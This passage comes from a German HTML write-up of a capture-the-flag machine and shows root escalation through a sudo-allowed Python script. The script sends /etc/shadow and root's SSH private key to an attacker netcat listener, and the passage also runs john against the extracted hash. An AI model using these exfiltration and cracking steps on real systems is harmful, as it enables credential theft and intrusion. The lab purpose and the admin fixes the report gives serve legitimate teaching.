+               6.  Unser Netcat-Listener empfängt einen POST-Request, dessen Body den Inhalt der `/etc/shadow`-Datei enthält.</p>
+               <p class="evaluation">**Bewertung:** Kritischer Fund! Obwohl wir das Skript nicht modifizieren mussten, erlaubt es uns die `sudo`-Regel, das Skript als `root` auszuführen und beliebige Dateien, auf die `root` Zugriff hat (wie `/etc/shadow`), an uns zu senden. Wir haben den Shadow-Hash für den Root-Benutzer.</p>
+               <p class="recommendation">**Empfehlung (Pentester):** Den extrahierten Root-Hash (`$6$...`) mit `john` oder `hashcat` und einer Wortliste (wie `rockyou.txt`) versuchen zu knacken. Alternativ das Skript verwenden, um den privaten SSH-Schlüssel von Root (`/root/.ssh/id_rsa`) an uns zu senden.
+               **Empfehlung (Admin):** Die `sudo`-Regel für `getfile.py` entfernen. Das Skript selbst ist unsicher, da es beliebige Dateien liest und sendet. Solche Funktionen sollten, falls notwendig, stark eingeschränkt und validiert werden.</p>
+
+               <p class="comment">Wir versuchen, den Root-Passwort-Hash zu knacken.</p>
+               <div class="code-block">
+                    <div class="terminal">
+                         <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">echo 'root:$6$ONBXfYmDyD2.uHR2$b8FgiI/1JXkRDB1noB5b3fObAXL3tbZj8QrUxpbmqcw99A17fIVY.6SZM2TrBY0WT1XY0n1T0ZNlx/XKfQNqh/:19092:0:99999:7:' > shadow</span></div>
+                         <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">john shadow --wordlist=/usr/share/wordlists/rockyou.txt</span></div>
+                         <pre>
+Using default input encoding: UTF-8
+Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
+[...]
+Will run 8 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+<span class="password">0g 0:00:08:42 55.27% (ETA: 16:43:14) 0g/s 15296p/s 15296c/s 15296C/s g0rd0n4..g032761</span>
+<span class="password"># (Kein Erfolg innerhalb kurzer Zeit, ETA sehr lang)</span>
+                         </pre>
+                     </div>
+                 </div>
+                 <p class="analysis">**Analyse:** Wir speichern den Root-Hash im John-Format in einer Datei `shadow` und starten `john` mit der `rockyou.txt`-Wortliste. Der Cracking-Prozess beginnt, aber nach einiger Zeit ist noch kein Passwort gefunden, und die geschätzte Restzeit (ETA) ist sehr lang.</p>
+                 <p class="evaluation">**Bewertung:** Das Knacken des Root-Passworts scheint mit dieser Wortliste nicht unmittelbar erfolgreich zu sein. Der Hash ist wahrscheinlich stark genug.</p>
+                 <p class="recommendation">**Empfehlung (Pentester):** Den alternativen Weg verfolgen: Den privaten SSH-Schlüssel von Root mit dem `getfile.py`-Skript extrahieren.
+                 **Empfehlung (Admin):** Starke, lange Passwörter für Root verwenden.</p>
+
+                 <p class="comment">Wir verwenden das `getfile.py`-Skript, um den privaten SSH-Schlüssel von Root zu extrahieren.</p>
+                 <div class="code-block">
+                      <div class="terminal">
+                           <div class="prompt"># <span class="command">Listener auf Angreifer-Maschine (Port 80)</span></div>
+                           <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvvp 80</span></div>
+                           <pre>listening on [any] 80 ...</pre>
+                           <div class="prompt"># <span class="command">Ausführung des Sudo-Befehls auf Zielsystem (als ralph)</span></div>
+                           <div class="prompt">ralph@ephemeral:~$ <span class="command">sudo -u root /usr/bin/python3 /home/ralph/getfile.py</span></div>
+                           <pre>
+File path: <span class="command">/root/.ssh/id_rsa</span> <span class="password"># Benutzereingabe 1</span>
+IP address: <span class="command">192.168.2.140</span> <span class="password"># Benutzereingabe 2</span>
+'unknown': I need something more specific.
+<span class="password">File /root/.ssh/id_rsa sent to 192.168.2.140</span>
+                           </pre>
+                           <div class="prompt"># <span class="command">Listener-Ausgabe auf Angreifer-Maschine</span></div>
+                           <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvvp 80</span></div>
+                           <pre>
+listening on [any] 80 ...
+connect to [192.168.2.140] from emeral.hmv [192.168.2.123] 3934X
+POST / HTTP/1.1
+[...]
+Content-Length: 2602
+
+<span class="password">-----BEGIN OPENSSH PRIVATE KEY-----</span>
+<span class="password">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn</span>
+[...] <span class="password">(Inhalt des privaten Root-SSH-Schlüssels)</span> [...]
+<span class="password">-----END OPENSSH PRIVATE KEY-----</span>
+                           </pre>
+                       </div>
+                   </div>
+                   <p class="analysis">**Analyse:** Wir wiederholen den Vorgang mit dem `getfile.py`-Skript, geben aber diesmal als Dateipfad `/root/.ssh/id_rsa` an. Unser Netcat-Listener empfängt erfolgreich den privaten SSH-Schlüssel des Root-Benutzers.</p>
+                   <p class="evaluation">**Bewertung:** Kritischer Erfolg! Wir haben den privaten SSH-Schlüssel von Root erlangt. Dies ermöglicht uns den direkten Login als Root.</p>
+                   <p class="recommendation">**Empfehlung (Pentester):** Den privaten Schlüssel speichern (z.B. `root_id_rsa`), Berechtigungen setzen (`chmod 600`) und sich damit als `root` per SSH auf dem Zielsystem anmelden (`ssh root@192.168.2.123 -i root_id_rsa`).
+                   **Empfehlung (Admin):** `sudo`-Regel entfernen, Skript sichern/entfernen.</p>
+
+                   <p class="comment">*(Der Bericht zeigt keinen SSH-Login mit dem Root-Schlüssel, sondern verwendet das Skript erneut, um direkt die Root-Flag zu lesen. Dies ist weniger elegant, funktioniert aber auch.)*</p>
+                   <div class="code-block">
+                        <div class="terminal">
+                           <div class="prompt"># <span class="command">Listener auf Angreifer-Maschine (Port 80)</span></div>
+                           <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvvp 80</span></div>
+                            <pre>listening on [any] 80 ...</pre>
+                           <div class="prompt"># <span class="command">Ausführung des Sudo-Befehls auf Zielsystem (als ralph)</span></div>
+                           <div class="prompt">ralph@ephemeral:~$ <span class="command">sudo -u root /usr/bin/python3 /home/ralph/getfile.py</span></div>
+                           <pre>
+File path: <span class="command">/root/root.txt</span> <span class="password"># Benutzereingabe 1</span>
+IP address: <span class="command">192.168.2.140</span> <span class="password"># Benutzereingabe 2</span>
+'unknown': I need something more specific.
+<span class="password">File /root/root.txt sent to 192.168.2.140</span>
+                           </pre>
+                           <div class="prompt"># <span class="command">Listener-Ausgabe auf Angreifer-Maschine</span></div>
+                            <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvvp 80</span></div>
+                           <pre>
+listening on [any] 80 ...
+connect to [192.168.2.140] from emeral.hmv [192.168.2.123] 3934X
+POST / HTTP/1.1
+[...]
+Content-Length: 33
+
+<span class="password">16c760c8c08bf9dd3363355ab77ef8da</span>
+                           </pre>
+                       </div>
+                   </div>
+                   <p class="analysis">**Analyse:** Das `getfile.py`-Skript wird ein drittes Mal ausgeführt, diesmal um direkt den Inhalt von `/root/root.txt` an unseren Listener zu senden. Der Listener empfängt die Root-Flag.</p>
+                   <p class="evaluation">**Bewertung:** Privilege Escalation zu Root erfolgreich (im Sinne des Flag-Zugriffs) durch Ausnutzung der unsicheren `sudo`-Regel für das Python-Skript.</p>
+                   <p class="recommendation">**Empfehlung (Pentester):** Flags dokumentieren, Bericht abschließen.
+                   **Empfehlung (Admin):** Unsichere `sudo`-Regel entfernen.</p>
+         </section>
+
+         <section id="flags">
+             <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+                <div class="flag-entry">
+                    <div class="flag-command">cat /home/ralph/user.txt</div>
+                    <div class="flag-value"><span class="password">0041e0826ce1e1d6da9e9371a8bb3bde</span></div>
+                </div>
+                <div class="flag-entry">
+                    <div class="flag-command">sudo python3 getfile.py /root/root.txt [IP]</div> <!-- Effektiver Befehl zum Lesen -->
+                    <div class="flag-value"><span class="password">16c760c8c08bf9dd3363355ab77ef8da</span></div>
+                </div>
+            </div>
+        </section>
+ 
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 7. Oktober 2022</p> <!-- Datum aus Nmap/enum4linux extrahiert -->
+    </footer>
+</body>
+</html>
